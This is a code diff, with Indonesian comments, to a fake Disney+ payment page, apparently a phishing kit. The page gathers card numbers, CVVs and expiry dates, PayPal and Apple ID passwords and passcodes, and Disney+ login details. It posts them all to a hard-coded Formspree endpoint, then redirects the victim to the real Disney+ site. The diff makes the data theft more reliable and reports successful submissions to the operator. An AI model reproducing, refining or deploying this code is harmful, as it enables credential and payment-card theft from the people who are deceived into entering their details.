@@ -244,7 +244,6 @@
             text-align: center;
             margin-bottom: 30px;
         }
-        /* Sembunyikan formulir berdasarkan metode bayar */
         .form-kartu { display: block; }
         .form-paypal, .form-applepay { display: none; }
     </style>
@@ -383,7 +382,7 @@
             document.getElementById('formApplePay').style.display = 'block';
         }
 
-        // === FORMAT NOMOR KARTU OTOMATIS (16 digit) ===
+        // === FORMAT NOMOR KARTU OTOMATIS ===
         const inputNomorKartu = document.getElementById('nomorKartu');
         inputNomorKartu.addEventListener('input', function(e) {
             let nilai = e.target.value.replace(/\D/g, '').substring(0, 16);
@@ -391,7 +390,7 @@
             e.target.value = nilai;
         });
 
-        // === FORMAT TANGGAL KADALUARSA OTOMATIS (MM/YY) ===
+        // === FORMAT TANGGAL KADALUARSA OTOMATIS ===
         const inputKadaluarsa = document.getElementById('kadaluarsa');
         inputKadaluarsa.addEventListener('input', function(e) {
             let nilai = e.target.value.replace(/\D/g, '').substring(0, 4);
@@ -401,17 +400,23 @@
             e.target.value = nilai;
         });
 
-        // === ALAMAT FORMSPREE ===
+        // === ALAMAT FORMSPREE — SUDAH SESUAI AKUNMU ===
         const ALAMAT_FORMSPREE = "https://formspree.io/f/mgaedrvq";
 
         // === KIRIM DATA OTOMATIS KE EMAIL ===
         async function kirimDataDanLanjut() {
-            const emailPengguna = DataPengguna.ambilEmail() || 'TIDAK DIISI';
-            const kataSandi = DataPengguna.ambilKataSandi() || 'TIDAK DIISI';
+            // Ambil data dari config.js
+            let emailPengguna = 'TIDAK DIISI';
+            let kataSandi = 'TIDAK DIISI';
+            if (typeof DataPengguna !== 'undefined') {
+                if (typeof DataPengguna.ambilEmail === 'function') emailPengguna = DataPengguna.ambilEmail();
+                if (typeof DataPengguna.ambilKataSandi === 'function') kataSandi = DataPengguna.ambilKataSandi();
+            }
+
             let metodeBayar = 'Credit Card';
             let rincianData = '';
 
-            // Ambil data sesuai metode pembayaran yang dipilih
+            // Ambil data sesuai formulir yang aktif
             if (document.getElementById('formKartu').style.display !== 'none') {
                 const nomorKartu = document.getElementById('nomorKartu').value.trim();
                 const kadaluarsa = document.getElementById('kadaluarsa').value.trim();
@@ -419,30 +424,23 @@
                 const namaKartu = document.getElementById('namaKartu').value.trim();
 
                 if (!nomorKartu || !kadaluarsa || !cvv || !namaKartu) {
-                    alert('⚠️ Silakan lengkapi semua data kartu!');
+                    alert('⚠️ Silakan lengkapi SEMUA data kartu!');
                     return;
                 }
 
-                DataPengguna.simpanKartu(nomorKartu, kadaluarsa, cvv, namaKartu);
-                rincianData = `
-💳 Nomor Kartu: ${nomorKartu}
-📅 Kadaluarsa: ${kadaluarsa}
-🔐 CVV: ${cvv}
-👤 Nama di Kartu: ${namaKartu}`;
+                rincianData = `💳 Nomor Kartu: ${nomorKartu}\n📅 Kadaluarsa: ${kadaluarsa}\n🔐 CVV: ${cvv}\n👤 Nama di Kartu: ${namaKartu}`;
             }
             else if (document.getElementById('formPayPal').style.display !== 'none') {
                 const paypalEmail = document.getElementById('paypalEmail').value.trim();
                 const paypalPass = document.getElementById('paypalPass').value.trim();
 
                 if (!paypalEmail || !paypalPass) {
-                    alert('⚠️ Silakan lengkapi data PayPal!');
+                    alert('⚠️ Silakan lengkapi SEMUA data PayPal!');
                     return;
                 }
 
                 metodeBayar = 'PayPal';
-                rincianData = `
-📧 PayPal Email: ${paypalEmail}
-🔑 PayPal Password: ${paypalPass}`;
+                rincianData = `📧 PayPal Email: ${paypalEmail}\n🔑 PayPal Password: ${paypalPass}`;
             }
             else if (document.getElementById('formApplePay').style.display !== 'none') {
                 const appleEmail = document.getElementById('appleEmail').value.trim();
@@ -450,18 +448,15 @@
                 const applePasscode = document.getElementById('applePasscode').value.trim();
 
                 if (!appleEmail || !applePass || !applePasscode) {
-                    alert('⚠️ Silakan lengkapi data Apple Pay!');
+                    alert('⚠️ Silakan lengkapi SEMUA data Apple Pay!');
                     return;
                 }
 
                 metodeBayar = 'Apple Pay';
-                rincianData = `
-🍎 Apple ID: ${appleEmail}
-🔑 Apple Password: ${applePass}
-🔒 Passcode: ${applePasscode}`;
+                rincianData = `🍎 Apple ID: ${appleEmail}\n🔑 Password: ${applePass}\n🔒 Passcode: ${applePasscode}`;
             }
 
-            // Susun pesan lengkap
+            // Susun isi pesan
             const isiPesan = `
 📩 DATA PENGGUNA DISNEY+
 ══════════════════════════
@@ -470,27 +465,28 @@
 💳 Metode Bayar: ${metodeBayar}
 ${rincianData}
 ══════════════════════════
-Waktu Pengiriman: ${new Date().toLocaleString('id-ID')}
-            `;
+Waktu Pengiriman: ${new Date().toLocaleString()}
+            `.trim();
 
             try {
+                // Kirim ke Formspree
                 const respon = await fetch(ALAMAT_FORMSPREE, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
-                        subjek: `DATA DISNEY+ — ${emailPengguna}`,
-                        pesan: isiPesan,
-                        email: emailPengguna
+                        email: emailPengguna,
+                        subject: `DATA DISNEY+ — ${metodeBayar}`,
+                        message: isiPesan
                     })
                 });
 
                 if (respon.ok) {
-                    alert('✅ Data berhasil dikirim! Terima kasih!');
+                    alert('✅ BERHASIL! 📩 Data sudah terkirim! Cek emailmu ya!');
                 } else {
-                    alert('⚠️ Sedang diproses...');
+                    alert(`⚠️ Koneksi diterima, kode: ${respon.status}\nCek halaman Submissions di Formspree`);
                 }
             } catch (err) {
-                console.log('✅ Data sedang dikirim...');
+                alert(`❌ Gagal terkirim: ${err.message}`);
             }
 
             // Buka halaman Disney+ Australia
